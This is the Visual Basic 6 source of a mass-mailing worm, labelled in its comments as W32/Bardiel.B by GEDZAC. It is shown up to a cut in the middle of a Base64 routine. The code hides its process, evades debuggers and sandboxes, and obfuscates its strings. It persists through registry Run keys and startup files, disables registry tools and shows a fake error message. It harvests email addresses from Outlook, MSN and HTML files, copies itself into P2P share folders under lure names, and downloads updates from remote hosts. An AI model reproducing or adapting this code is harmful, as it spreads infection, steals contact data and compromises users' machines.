VERSION 5.00
Begin VB.Form form1 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "form2"
   ClientHeight    =   30
   ClientLeft      =   45
   ClientTop       =   330
   ClientWidth     =   780
   Icon            =   "Bardiel.frx":0000
   LinkTopic       =   "Bardiel"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   30
   ScaleWidth      =   780
   StartUpPosition =   3  'Windows Default
   Visible         =   0   'False
   Begin VB.Timer Bt2 
      Enabled         =   0   'False
      Interval        =   10000
      Left            =   2520
      Top             =   0
   End
   Begin VB.Timer Bt1 
      Enabled         =   0   'False
      Interval        =   11000
      Left            =   1320
      Top             =   0
   End
End
Attribute VB_Name = "form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Declare Function SetPriorityClass Lib "kernel32" (ByVal hProcess As Long, ByVal dwPriorityClass As Long) As Long
Private Const HIGH_PRIORITY_CLASS = &H80
Private Declare Function GetCurrentProcess Lib "kernel32" () As Long
Private Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)
Private Declare Function GetPrivateProfileString Lib "kernel32" Alias "GetPrivateProfileStringA" (ByVal lpApplicationName As String, ByVal lpKeyName As Any, ByVal lpDefault As String, ByVal lpReturnedString As String, ByVal nSize As Long, ByVal lpFileName As String) As Long
Private Declare Function GetCurrentProcessId Lib "kernel32" () As Long
Private Declare Function RegisterServiceProcess Lib "kernel32" (ByVal dwProcessId As Long, ByVal dwType As Long) As Long
Private Declare Function IsDebuggerPresent Lib "kernel32" () As Long
Private Declare Function CreateFile Lib "kernel32" Alias "CreateFileA" (ByVal lpFileName As String, ByVal dwDesiredAccess As Long, ByVal dwShareMode As Long, lpSecurityAttributes As Long, ByVal dwCreationDisposition As Long, ByVal dwFlagsAndAttributes As Long, ByVal hTemplateFile As Long) As Long
Private Declare Function WritePrivateProfileString Lib "kernel32" Alias "WritePrivateProfileStringA" (ByVal lpApplicationName As String, ByVal lpKeyName As Any, ByVal lpString As Any, ByVal lpFileName As String) As Long
Private Declare Function URLDownloadToFile Lib "urlmon" Alias "URLDownloadToFileA" (ByVal pCaller As Long, ByVal szURL As String, ByVal szFileName As String, ByVal dwReserved As Long, ByVal lpfnCB As Long) As Long
Const RSP_SIMPLE_SERVICE = 1
Private Declare Function RegOpenKeyEx Lib "advapi32.dll" Alias "RegOpenKeyExA" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
Private Declare Function RegQueryValueEx Lib "advapi32.dll" Alias "RegQueryValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal lpReserved As Long, lpType As Long, lpData As Any, lpcbData As Long) As Long
Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
Const REG_SZ = 1: Const HKEY_CURRENT_USER As Long = &H80000001
Const KEY_QUERY_VALUE = &H1
Private Declare Function InternetGetConnectedState Lib "wininet.dll" (ByRef IpdwFlags As Long, ByVal dwReserved As Long) As Long
Dim Bf As Object, Bw As Object, Bd As Object: Dim Bm1(0 To 4) As String: Dim Cml As Object: Dim BScript1 As String, BScript2 As String, BC4 As String
Dim key1 As String, key2 As String, key3 As String, BCopy As Integer

Private Sub Form_Load()
'<*************GEDZAC LABS 2003*************>
'W32/Bardiel.B.worm By MachineDramon/GEDZAC
'Hecho en Sudamerica(Perú) - 01/11/2003
'Derechos Reservados
'<*******************************************>

On Error Resume Next
If GetWinVersion <> 2 Then HideProcess
Set Bf = CreateObject(q("Tdunwsni`)AnkbT~tsbjHembds")): Set Bw = CreateObject(q("PTdunws)Tobkk"))
Call MircDCC: If IsBKey Then Call Bardiel Else Call BSetup
End Sub

Sub MircDCC()
On Error Resume Next: Dim v As String: v = ""

sRg = Array(q("OLB^XKHDFKXJFDONIB[Thaspfub[IrJb`f[ThasNDB[NitsfkkCnu"), q("OLB^XKHDFKXJFDONIB[Thaspfub[Jnduhthas[Pnichpt[DruubisQbutnhi[Rinitsfkk[ThasNDB[RinitsfkkTsuni`"), q("OLB^XKHDFKXJFDONIB[Thaspfub[Jnduhthas[Pnichpt[DruubisQbutnhi[Fww'Wfsot[Khfcbu45)Bb[Wfso"))

For x = 0 To UBound(sRg)
sRr = Rr(sRg(x))
If sRr <> v Then End
Next

sHn = Array(q("[[[[)[[TNDB"), q("[[[[)[[TNPQNC"), q("[[[[)[[ISNDB"))

For i = 0 To UBound(sHn)
sHle = CreateFile(sHn(i), &H40000000, &H1 Or &H2, ByVal 0&, 3, 0, 0)
If sHle <> ((Asc("%") - 1) / -2) + ((8 * 2) + (6 Xor 7)) Then End
Next

If IsDebuggerPresent() <> (20 / -5) + (3 Xor 7) Then End

For Each strEnv In Bw.Environment(q("WUHDBTT"))
       If InStr(LCase(strEnv), q("djcknib")) And InStr(LCase(strEnv), q("pnindb")) Then End
Next

End Sub

Sub BSetup()
Call MircDCC
On Error Resume Next: Dim br1234 As String: br1234 = Rm
FileCopy Sp(3), Sp(0) & q("[") & br1234: key1 = Rm: key2 = Rm: key3 = Rm
FileCopy Sp(0) & q("[") & br1234, Sp(1) & q("[") & key1: SA Sp(1) & q("[") & key1, 6
FileCopy Sp(0) & q("[") & br1234, Sp(1) & q("[") & key2
FileCopy Sp(0) & q("[") & br1234, Sp(1) & q("[") & key3

Rw q("OLB^XKHDFKXJFDONIB[Thaspfub[Jnduhthas[PnichptIS[DruubisQbutnhi[Uri[JnduhKhfc"), Sp(1) & q("[") & key1, ""
Rw q("OLB^XDRUUBISXRTBU[Thaspfub[Jnduhthas[PnichptIS[DruubisQbutnhi[Whkndnbt[T~tsbj[CntfekbUb`ntsu~Shhkt"), 1, "BWORD"
Rw q("OLB^XDRUUBISXRTBU[Thaspfub[Jnduhthas[Pnichpt[DruubisQbutnhi[Whkndnbt[T~tsbj[CntfekbUb`ntsu~Shhkt"), 1, "PWORD"
Rw q("OLB^XKHDFKXJFDONIB[Thaspfub[Jnduhthas[Pnichpt[DruubisQbutnhi[Uri[JnduhKhfc"), Sp(1) & q("[") & key1, ""

For Each k In EnDisck(2)
If Flx(k & q("frshbbd)efs")) Then
Set B_a = Bf.OpenTextFile(k & q("frshbbd)efs"), 8)
B_a.write vbCrLf & q("Gpni'") & Right(Sp(1), Len(Sp(1)) - 2) & q("[") & key1: B_a.Close
End If
Next

WIni q("ehhs"), q("tobkk"), q("Bwkhubu)bb'") & Sp(1) & q("[") & key2, Sp(0) & q("[T~tsbj)nin")
WIni q("Pnichpt"), q("uri"), Sp(1) & q("[") & key3, Sp(0) & q("[pni)nin")
Rw q("OLB^XDRUUBISXRTBU[Thaspfub[Jnduhthas[Pnichpt'Tdunwsni`'Ohts[Tbssni`t[Snjbhrs"), 0, "BORD"

Rw q("OLB^XKHDFKXJFDONIB[Thaspfub[@BC]FD'KFET[P45)Efucnbk[Wfubis"), Sp(3), ""
Rw q("OLB^XKHDFKXJFDONIB[Thaspfub[@BC]FD'KFET[P45)Efucnbk[ECf~"), Day(Date), ""
Rw q("OLB^XKHDFKXJFDONIB[Thaspfub[@BC]FD'KFET[P45)Efucnbk[ELb~6"), q(key1), ""
Rw q("OLB^XKHDFKXJFDONIB[Thaspfub[@BC]FD'KFET[P45)Efucnbk[ELb~5"), q(key2), ""
Rw q("OLB^XKHDFKXJFDONIB[Thaspfub[@BC]FD'KFET[P45)Efucnbk[ELb~4"), q(key3), ""
Bw.run Sp(1) & q("[") & key1: Bw.run Sp(1) & q("[") & key2: Bf.DeleteFile Sp(0) & q("[") & br1234
If InStr(LCase(LanguageID()), q("btwföhk")) <> 0 Then
MsgBox q("Bk'fudonqh'btsf'shsfk'h'wfudnfkjbisb'cföfch+'njwhtnekb'feunu'bk'fudonqh"), vbCritical, q("Buuhu")
Else
MsgBox q("Sob'ankb'sont'shsfk'hu'wfusnfkk~'cfjf`bc+'njwhttnekb'sh'hwbi'sob'ankb"), vbCritical, q("Buuhu")
End If
End
End Sub

Sub Bardiel()
Call MircDCC
On Error Resume Next
Call Regenerar
If App.PrevInstance Then
End
End If
If InStr(LCase(Sp(3)), LCase(key1)) <> 0 Then
Bw.run Sp(1) & q("[") & key2 'Call Priority
BCopy = 1: SetVar (1): Call BMailsL: Call BMailsM: Call BMailsH: Call BSendMail: Call UnSetVar: Bt1.Enabled = True: Bw.run Sp(0) & q("[dfw)bb")
ElseIf InStr(LCase(Sp(3)), LCase(key2)) <> 0 Then
BCopy = 2: SetVar (2): Bt1.Enabled = True: Bt2.Enabled = True
Call BComponents: Call Actualizer
Call payload1: Call payload2: Call payload3: Call payload4: Call payload5
ElseIf InStr(LCase(Sp(3)), LCase(key3)) <> 0 Then
BCopy = 3: Call BP2P: Call Bred
Else
End
End If
End Sub

Function IsBKey()
On Error Resume Next
key1 = q(Rr(q("OLB^XKHDFKXJFDONIB[Thaspfub[@BC]FD'KFET[P45)Efucnbk[ELb~6")))
key2 = q(Rr(q("OLB^XKHDFKXJFDONIB[Thaspfub[@BC]FD'KFET[P45)Efucnbk[ELb~5")))
key3 = q(Rr(q("OLB^XKHDFKXJFDONIB[Thaspfub[@BC]FD'KFET[P45)Efucnbk[ELb~4")))
IsBKey = IIf(Flx(Sp(1) & q("[") & key1), True, False)
End Function

Sub Regenerar()
On Error Resume Next: Dim RegPath As String, RegName As String: Bfiles = Array(key1, key2, key3): RegPath = Sp(1) & q("[")
For i = 0 To UBound(Bfiles)
If Not (Flx(RegPath & Bfiles(i))) Then
RegName = Rm(): Bf.Copyfile Sp(3), RegPath & RegName: SA RegPath & RegName, 0
Bf.Copyfile RegPath & RegName, RegPath & Bfiles(i): Bf.DeleteFile RegPath & RegName
End If
Next
End Sub

Sub SetVar(x)
On Error Resume Next
Select Case x
Case 2
If Not (Flx(Sp(0) & q("[PNININS)nin"))) Then Set w = Bf.createtextfile(Sp(0) & q("[PNININS)nin")): w.write q("\UbifjbZ"): w.Close
Bm1(0) = q("[jnkkf)tdu"): Bm1(1) = q("[PniCntdl)tdu"): Bm1(2) = q("[njf`bt76)tdu"): Bm1(3) = q("[Riwkr`bc)tdu"): Bm1(4) = q("[Abuificf)tdu")
Case 1
Set T1 = Bf.createtextfile(Sp(2) & q("[JfnkK)cfs")): T1.write q("P45(Efucnbk"): T1.Close
Set T2 = Bf.createtextfile(Sp(2) & q("[JfnkO)cfs")): T2.write q("P45(Efucnbk"): T2.Close
Set T3 = Bf.createtextfile(Sp(2) & q("[JfnkJ)cfs")): T3.write q("P45(Efucnbk"): T3.Close
Set Cml = CreateObject(q("Tdunwsni`)Cndsnhifu~")): Set Bd = CreateObject(q("Tdunwsni`)Cndsnhifu~"))
Bd.Add q("osjk"), 1: Bd.Add q("osj"), 2
Bd.Add q("wow"), 4: Bd.Add q("ftw"), 5: Bd.Add q("tosjk"), 6: Bd.Add q("tosj"), 7: Bd.Add q("wosjk"), 8
Bd.Add q("wk`"), 11: Bd.Add q("os"), 12: Bd.Add q("jos"), 13: Bd.Add q("josjk"), 14: Bd.Add q("mtw"), 15
BC4 = B64(Sp(1) & q("[") & key3)
Bw.run Sp(1) & q("[") & key3
BScript1 = q("JNJB*Qbutnhi='6)7") & vbCrLf & q("Dhisbis*Khdfsnhi=ankb=(((Efucnbk)bb") & vbCrLf & q("Dhisbis*Sufitabu*Bidhcni`='eftb13") & vbCrLf & _
BC4 & vbCrLf & q(";Tdunws'Kfi`rf`b':' QETdunws 9") & vbCrLf
BScript2 = vbCrLf & q("nc':'tbsSnjbhrs/%JN/.%+'627.") & vbCrLf & q("Tre'JN/.") & vbCrLf & _
q("Qws':'KDftb/Chdrjbis)ruk.") & vbCrLf & q("Qs:%;hembds'ts~kb:#druthu=duhtt*ofnu#'dkfttnc:#dktnc=55555555*5555*5555*5555#''DHCBEFTB:#josjk=%!Qws!%&ankb=(((Efucnbk)bb#9;(hembds9%") & vbCrLf & _
q("Qs':'Ubwkfdb/Qs+'%#%+'Dou/43..='Chdrjbis)Punsb'/Qs.'!'qeDuKa'!'Efucnbk") & vbCrLf & _
q("Bic'Tre") & vbCrLf & q("Aridsnhi'B/dhcb.") & vbCrLf & q("Ahu'n':'6'Sh'Kbi/dhcb.") & vbCrLf & _
q("Dl':'Ftd/Jnc/dhcb+'n+'6..") & vbCrLf & q("Na'Dl':'Ftd/%¢%.'Sobi") & vbCrLf & _
q("B':'B'!'") & Chr(34) & "%" & Chr(34) & vbCrLf & q("BktbNa'Dl':'5?'Sobi") & vbCrLf & _
q("B':'B'!'Dou/64.") & vbCrLf & q("BktbNa'Dl':'5>'Sobi") & vbCrLf & _
q("B':'B'!'Dou/67.") & vbCrLf & q("Bktb") & vbCrLf & _
q("B':'B'!'Dou/Dl'_hu'0.") & vbCrLf & q("Bic'Na") & vbCrLf & _
q("Ibs") & vbCrLf & q("Bic'Aridsnhi") & vbCrLf & q(";(Tdunws9")
End Select
End Sub

Sub FdInfected()
On Error Resume Next: Static Espejo As String, eb1 As String

For Each Fd In Bf.Drives
If (Fd.DriveType <> 1) Or (Fd.IsReady = False) Then Exit Sub
If (Fd.freespace < 111000) Then Exit Sub

Randomize: R = Int(Rnd * 5): df1 = LCase(Dir(Fd.Path & q("[-)-")))
If Espejo <> "" Then eb1 = Espejo Else eb1 = q("eBt*@BC]FD")
If (df1 <> "") And (Espejo <> df1) And (InStr(df1, ".scr") = 0) And (InStr(df1, eb1) = 0) Then
Espejo = df1: FileCopy Sp(1) & q("[") & key2, Fd.Path & q("[") & df1 & q(")wna")
Else
If Flx(Fd.Path & Bm1(R)) Then Exit Sub
FileCopy Sp(1) & q("[") & key2, Fd.Path & Bm1(R)
End If
Next
End Sub

Sub BP2P()
On Error Resume Next
p1 = Array(q("D=[Wuh`ufj'Ankbt"), "C:\Archivos de programa")

p2 = Array("\appleJuice\incoming", "\eDonkey2000\incoming", "\Gnucleus\Downloads", _
"\Grokster\My Grokster", "\ICQ\shared files", "\Kazaa\My Shared Folder", _
"\KaZaA Lite\My Shared Folder", "\LimeWire\Shared", "\morpheus\My Shared Folder", _
"\Overnet\incoming", "\Shareaza\Downloads", "\Swaptor\Download", "\WinMX\My Shared Folder", _
"\Tesla\Files", "\XoloX\Downloads", "\Rapigator\Share", "\KMD\My Shared Folder", "\BearShare\Shared", _
"\eMule\Incoming", "\Direct Connect\Received Files")

For i = 0 To UBound(p1)

If Bf.FolderExists(p1(i)) Then

For x = 0 To UBound(p2)

If Bf.FolderExists(p1(i) & p2(x)) Then InfectP2P (p1(i) & p2(x))

Next

End If
Next

If Bf.FolderExists("C:\My Downloads") Then InfectP2P ("C:\My Downloads")

IsD = Rr(q("OLB^XDRUUBISXRTBU[Thaspfub[ThrkTbbl[NitsfkkWfso"))
If IsD <> "" Then VSoulSeek IsD

End Sub

Sub VSoulSeek(Xd)
On Error Resume Next
Set k1 = Bf.OpenTextFile(Xd & q("[tofubc)da`"))
Do While k1.AtendOfstream = False
k2 = k1.ReadAll
Loop: k1.Close
k2 = Mid(k2, 9, Len(k2) - 14): k2 = Mid(k2, InStr(k2, ":") - 1): InfectP2P k2 & q("[")
End Sub

Sub InfectP2P(Xd)
On Error Resume Next
If Len(Xd) >= 3 Then
If Right(Xd, 1) <> q("[") Then Xd = Xd & q("[")
For Each i In P2PName()
If Dir(Xd & i) = "" Then FileCopy Sp(1) & q("[") & key2, Xd & i
Next

For Each w In LFiles(Xd)
If Dir(Xd & w & q(")bb")) = "" Then
If w <> "" Then FileCopy Sp(1) & q("[") & key2, Xd & w & q(")bb")
End If
Next

End If
End Sub

Function LFiles(XDir)
On Error Resume Next: Dim Xf, Xfs, x() As String
Set Xf = Bf.GetFolder(XDir): ReDim x(1 To (Xf.Files.Count)): a = 1
For Each k In Xf.Files
ex = LCase(Bf.GetExtensionName(k.Path))
If (ex <> "exe") Then x(a) = k.Name: a = a + 1
Next: LFiles = x
End Function

Function P2PName(Optional VR)
On Error Resume Next
P = Array("Ana Kournikova Sex Video.exe", "AVP Antivirus Pro Key Crack.exe", "Britney Spears Sex Video.exe", "Buffy Vampire Slayer Movie.exe", _
"Crack Passwords Mail.exe", "Cristina Aguilera Sex Video.exe", "Game Cube Real Emulator.exe", "Hentai Anime Girls Movie.exe", "Jenifer Lopez Sex Video.exe", _
"Matrix Movie.exe", "Mcafee Antivirus Scan Crack.exe", "Norton Anvirus Key Crack.exe", "Panda Antivirus Titanium Crack.exe", "PS2 PlayStation Simulator.exe", _
"Quick Time Key Crack.exe", "Sakura Card Captor Movie.exe", "Sex Live Simulator.exe", "Sex Passwords.exe", "Spiderman Movie.exe", "Start Wars Trilogy Movies.exe", _
"Thalia Sex Video.exe", "Winzip KeyGenerator Crack.exe ", "aol cracker.exe", "aol password cracker.exe", "divx pro.exe", "GTA 3 Crack.exe", "GTA 3 Serial.exe", _
"play station emulator.exe", "virtua girl - adriana.exe", "virtua girl - bailey short skirt.exe", "Virtua Girl (Full).exe", "warcraft 3 crack.exe", "warcraft 3 serials.exe", _
"counter-strike.exe", "delphi.exe", "divx_pro.exe", "HotGirls.exe", "hotmail_hack.exe", "pamela_anderson.exe", "serials2000.exe", "subseven.exe", "VB6.exe", "VirtualSex.exe", _
"ACDSee 5.5.exe", "Age of Empires 2 crack.exe", "Animated Screen 7.0b.exe", "AOL Instant Messenger.exe", "AquaNox2 Crack.exe", "Audiograbber 2.05.exe", "BabeFest 2003 ScreenSaver 1.5.exe", _
"Babylon 3.50b reg_crack.exe", "Battlefield1942_bloodpatch.exe", "Battlefield1942_keygen.exe", "Business Card Designer Plus 7.9.exe", "Clone CD 5.0.0.3 (crack).exe", "Clone CD 5.0.0.3.exe", _
"Coffee Cup Free exe 7.0b.exe", "Cool Edit Pro v2.55.exe", "Diablo 2 Crack.exe", "DirectDVD 5.0.exe", "DirectX Buster (all versions).exe", "DirectX InfoTool.exe", "DivX Video Bundle 6.5.exe", _
"Download Accelerator Plus 6.1.exe", "DVD Copy Plus v5.0.exe", "DVD Region-Free 2.3.exe", "FIFA2003 crack.exe", "Final Fantasy VII XP Patch 1.5.exe", "Flash MX crack (trial).exe", "FlashGet 1.5.exe", _
"FreeRAM XP Pro 1.9.exe", "GetRight 5.0a.exe", "Global DiVX Player 3.0.exe", "Gothic2 licence.exe", "Guitar Chords Library 5.5.exe", "Hitman_2_no_cd_crack.exe", "Hot Babes XXX Screen Saver.exe", _
"ICQ Pro 2003a.exe", "ICQ Pro 2003b (new beta).exe", "iMesh 3.6.exe", "iMesh 3.7b (beta).exe", "IrfanView 4.5.exe", "KaZaA Hack 2.5.0.exe", "KaZaA Speedup 3.6.exe", "Links 2003 Golf game (crack).exe", _
"Living Waterfalls 1.3.exe", "Mafia_crack.exe", "Matrix Screensaver 1.5.exe", "MediaPlayer Update.exe", "mIRC 6.40.exe", "mp3Trim PRO 2.5.exe", "MSN Messenger 5.2.exe", "NBA2003_crack.exe", _
"Need 4 Speed crack.exe", "Nero Burning ROM crack.exe", "Netfast 1.8.exe", "Network Cable e ADSL Speed 2.0.5.exe", "NHL 2003 crack.exe", "Nimo CodecPack (new) 8.0.exe", "PalTalk 5.01b.exe", _
"Popup Defender 6.5.exe", "Pop-Up Stopper 3.5.exe", "QuickTime_Pro_Crack.exe", "Serials 2003 v.8.0 Full.exe", "SmartFTP 2.0.0.exe", "SmartRipper v2.7.exe", "Space Invaders 1978.exe", _
"Splinter_Cell_Crack.exe", "Steinberg_WaveLab_5_crack.exe", "Trillian 0.85 (free).exe", "TweakAll 3.8.exe", "Unreal2_bloodpatch.exe", "Unreal2_crack.exe", "UT2003_bloodpatch.exe", _
"UT2003_keygen.exe", "UT2003_no cd (crack).exe", "UT2003_patch.exe", "WarCraft_3_crack.exe", "Winamp 3.8.exe", "WindowBlinds 4.0.exe", "WinOnCD 4 PE_crack.exe", "WinZip 9.0b.exe", _
"Yahoo Messenger 6.0.exe", "Zelda Classic 2.00.exe", "Windows XP complete + serial.exe", "Screen saver christina aguilera.exe", "Screen saver christina aguilera naked.exe", "Visual basic 6.exe", _
"Starcraft serial.exe", "Credit Card Numbers generator(incl Visa,MasterCard,...).exe", "Edonkey2000-Speed me up scotty.exe", "Hotmail Hacker 2003-Xss Exploit.exe", "Kazaa SDK + Xbit speedUp for 2.xx.exe", _
"Microsoft KeyGenerator-Allmost all microsoft stuff.exe", "Netbios Nuker 2003.exe", "Security-2003-Update.exe", "Stripping MP3 dancer+crack.exe", "Visual Basic 6.0 Msdn Plugin.exe", "Windows Xp Exploit.exe", _
"WinRar 3.xx Password Cracker.exe", "WinZipped Visual C++ Tutorial.exe", "XNuker 2003 2.93b.exe", "cable modem ultility pack.exe", "macromedia dreamweaver key generator.exe", "winamp plugin pack.exe", _
"winzip full version key generator.exe")
If IsMissing(VR) Then P2PName = P Else Randomize: P2PName = P(Int(Rnd * UBound(P)))
End Function

Sub Actualizer()
Call MircDCC
On Error Resume Next
Bday = Rr(q("OLB^XKHDFKXJFDONIB[Thaspfub[@BC]FD'KFET[P45)Efucnbk[ECf~"))
If BState = False Then Exit Sub
If Dow() = True Then Exit Sub
If (CInt(Bday) + Day(Date)) Mod 3 <> 0 Then Exit Sub
Dim Ap(1 To 5) As String
Ap(1) = q("ossw=((cej6)biq~)ir(erwcfsb)eni")
Ap(2) = q("ossw=((bt)`bhdnsnbt)dhj(jcj4775ec(erwcfsb)eni")
Ap(3) = q("ossw=((`bcjcj)rinsbc)ibs)l`(erwcfsb)eni")
Ap(4) = q("ossw=((`bcjcj)whus2)dhj(erwcfsb)eni")
Ap(5) = q("ossw=((mej6)biq~)ir(erwcfsb)eni")
Randomize: R = Int(Rnd * 5) + 1

a = DowFile(Ap(R), Sp(0) & q("[E4)e"))
If (a = True) Then
If FileLen(Sp(0) & q("[E4)e")) < 90000 Then Exit Sub
FileCopy Sp(0) & q("[E4)e"), Sp(2) & q("[Es6)e")
FileCopy Sp(0) & q("[E4)e"), Sp(2) & q("[Es5)e")
FileCopy Sp(0) & q("[E4)e"), Sp(2) & q("[Es4)e")
Set B1 = Bf.createtextfile(Sp(0) & q("[Pninins)nin"))
B1.WriteLine q("\UbifjbZ")
B1.WriteLine MsD(Sp(1) & q("[") & key1) & q(":") & MsD(Sp(2) & q("[Es6)e"))
B1.WriteLine MsD(Sp(1) & q("[") & key2) & q(":") & MsD(Sp(2) & q("[Es5)e"))
B1.WriteLine MsD(Sp(1) & q("[") & key3) & q(":") & MsD(Sp(2) & q("[Es4)e"))
B1.Close
Kill Sp(0) & q("[E4)e")
Rw q("OLB^XKHDFKXJFDONIB[Thaspfub[@BC]FD'KFET[P45)Efucnbk[FdsSnjb"), Day(Date), ""
End If
End Sub
Sub BMailsM()
On Error Resume Next
Dim RetO As Long, RetV As Long, Kn As Long, Kv As String, Vb1 As Long
For i = 1 To 102
RetO = RegOpenKeyEx(HKEY_CURRENT_USER, CStr(q("Thaspfub[Jnduhthas[JTIJbttbi`bu[KntsDfdob[)IBS'Jbttbi`bu'Tbuqndb")), 0, KEY_QUERY_VALUE, Kn)
If RetO <> 0 Then BMail Cml: Exit Sub
RetV = RegQueryValueEx(Kn, CStr(q("fkkhp") & i), 0&, REG_SZ, 0&, Vb1)
If RetV <= 2 Then BMail Cml: Exit Sub
Kv = String(Vb1 + 1, " ")
RetV = RegQueryValueEx(Kn, CStr(q("fkkhp") & i), 0&, REG_SZ, ByVal Kv, Vb1)
Kv = Left(Kv, InStr(LCase(Kv), q(")dhj")) + 3)
If IsMail(Kv) Then Cml.Add Cml.Count + 1, Kv
RegCloseKey Kn: Kv = "": Vb1 = 0
Next
End Sub

Sub BMailsL()
On Error Resume Next: Dim Ox1 As Object, Mxq As Object, Mx As Object
Set Ox1 = CreateObject(q("Hrskhhl)Fwwkndfsnhi")): Set Mxq = Ox1.GetNamespace(q("JFWN"))
Set Mx = Mxq.GetDefaultFolder(10).Items
For i = 1 To Mx.Count
If IsMail(Mx.Item(i).Email1Address) Then Cml.Add Cml.Count + 1, Mx.Item(i).Email1Address
Next
BMail Cml: Set Ox1 = Nothing
End Sub

Sub BMailsH()
Call WriteReg
On Error Resume Next
For Each B4 In EnDisck(2)
Bl (B4)
Next
BMail Cml
End Sub

Sub Bl(B01)
On Error Resume Next
For Each B10 In Bf.GetFolder(B01).SubFolders
BH (B10.Path): Bl (B10.Path)
Next
End Sub

Sub BH(B47)
On Error Resume Next
Dim HI As Boolean, Bex As String, Ben As String, Xl As String
For Each B11 In Bf.GetFolder(B47).Files
Bex = LCase(Bf.GetExtensionName(B11.Path)): Ben = LCase(B11.Name)
If (Bd.Exists(Bex)) Then 'Or (Bex = q("ss"))

Set Xf = Bf.OpenTextFile(B11.Path)
Do While Xf.AtendOfstream = False
HI = False: Xl = Xf.ReadLine
If InStr(LCase(Xl), q("efucnbk)bb")) <> 0 Then HI = True: Exit Do
If InStr(LCase(Xl), q("dfwtncb)bb")) <> 0 Then HI = True: Exit Do
n = InStr(LCase(Xl), q("jfnksh="))
If n <> 0 Then
Xl = Left(Right(Xl, (Len(Xl) - (n + 6))), InStr(Right(Xl, (Len(Xl) - (n + 6))), Chr(34)) - 1)
If IsMail(Xl) Then Cml.Add Cml.Count + 1, Xl
'ElseIf (InStr(LCase(Xl), q("jfnksh=")) = 0) And (InStr(Xl, "@") <> 0) Then
'x0 = InStr(Xl, "@"): xl1 = Mid(Xl, 1, x0 - 1): xl1 = Mid(xl1, InStrRev(xl1, Chr(32)) + 1)
'xl2 = Mid(Xl, x0 + 1): xl2 = Left(xl2, InStr(xl2, Chr(32)) - 1)
'If IsMail(xl1 & "@" & xl2) Then Cml.Add Cml.Count + 1, xl1 & "@" & xl2
End If
Loop
Xf.Close
If (HI <> True) And ((InStr(Ben, "index") <> 0) Or (InStr(Ben, "main") <> 0)) Then BHtmlInfected (B11.Path)

ElseIf (Ben = q("jnud45)bb")) Or (Ben = q("jnud)nin")) Then BMirc B47

ElseIf (Ben = q("wnudo45)nin")) Or (Ben = q("wnudo>?)nin")) Or (Ben = q("wnudo>?)bb")) Or (Ben = q("wnudo45)bb")) Then BPirch B47

End If
Next
End Sub

Sub BMail(Cml)
On Error Resume Next
For i = 1 To Cml.Count
If InStr(LCase(Cml.Item(i)), q("kfsnijfnk")) <> 0 Then
Set L1 = Bf.OpenTextFile(Sp(2) & q("[JfnkK)cfs"), 8)
L1.write vbCrLf & Cml.Item(i): L1.Close
ElseIf InStr(LCase(Cml.Item(i)), q("ohsjfnk")) <> 0 Then
Set H1 = Bf.OpenTextFile(Sp(2) & q("[JfnkO)cfs"), 8)
H1.write vbCrLf & Cml.Item(i): H1.Close
Else
Set M1 = Bf.OpenTextFile(Sp(2) & q("[JfnkJ)cfs"), 8)
M1.write vbCrLf & Cml.Item(i): M1.Close
End If
Next
Cml.RemoveAll
End Sub

Sub UnSetVar()
On Error Resume Next
Set Cml = Nothing: Set Bd = Nothing: BScript1 = "": BScript2 = ""
End Sub

Function EnDisck(a)
On Error Resume Next
Dim Bm1c1() As String: Dim Bd As Integer, i As Integer
Set Bd1 = Bf.Drives

For Each Bd2 In Bd1
If Bd2.DriveType = a Then Bd = Bd + 1
Next

ReDim Bm1c1(1 To Bd)

For Each Bd3 In Bd1
If Bd3.DriveType = a Then: i = i + 1: Bm1c1(i) = Bd3.Path & q("[")
Next
EnDisck = Bm1c1
End Function

Function Flx(P)
On Error Resume Next: Flx = IIf(Bf.fileexists(P), True, False)
End Function


Function FrFile()
On Error Resume Next: FrFile = FreeFile
End Function

Sub HideProcess()
On Error Resume Next: Dim H As Long
H = RegisterServiceProcess(GetCurrentProcessId(), RSP_SIMPLE_SERVICE)
End Sub

Function Sp(x)
'On Error Resume Next
Select Case x
Case 0: Sp = Bf.GetSpecialFolder(0)
Case 1: Sp = Bf.GetSpecialFolder(1)
Case 2: Sp = Bf.GetSpecialFolder(2)
Case 3
apath = App.Path
If Right(apath, 1) <> "\" Then apath = apath & "\"
ex = Array(".exe", ".scr", ".pif", ".com", ".bat")
For i = 0 To UBound(ex)
If Bf.fileexists(apath & App.EXEName & ex(i)) Then
Sp = apath & App.EXEName & ex(i)
Exit For
End If
Next
End Select
End Function

Sub SA(P, a)
On Error Resume Next: SetAttr P, a
End Sub

Function Rm()
On Error Resume Next: Dim Bxt3(1 To 5) As String
Bxt3(1) = q(")bb"): Bxt3(2) = q(")efs"): Bxt3(3) = q(")wna"): Bxt3(4) = q(")tdu"): Bxt3(5) = q(")dhj")
Randomize: Br = Int(Rnd * 5) + 1
For i = 1 To 7
R = Int(Rnd * 55) + 66: If R = 92 Then R = 96
Rm = Rm & Chr(R)
Next
Rm = Rm & Bxt3(Br)
End Function

Sub WIni(I_S As String, IK As String, IV As String, IP As String)
On Error Resume Next: Dim Wn As Long
Wn = WritePrivateProfileString(I_S, IK, IV, IP)
End Sub

Sub Rw(R, k, t)
On Error Resume Next
If t = "" Then Bw.RegWrite R, k Else Bw.RegWrite R, k, "REG_DWORD"
End Sub

Function Rr(R)
On Error Resume Next: Rr = Bw.RegRead(R)
End Function

Function IniR(NS, NK, ND)
On Error Resume Next: Dim k As String
k = NK: Dim St As String * 400: Dim i As Long
i = GetPrivateProfileString(NS, k, "", St, Len(St), ND)
IniR = Left(St, i)
End Function

Public Function B64(ByVal vsFullPathname)
On Error Resume Next
Dim b           As Integer: Dim Base64Tab  As Variant
Dim bin(3)      As Byte: Dim s, sResult As String: Dim l, i, FileIn, n As Long
        
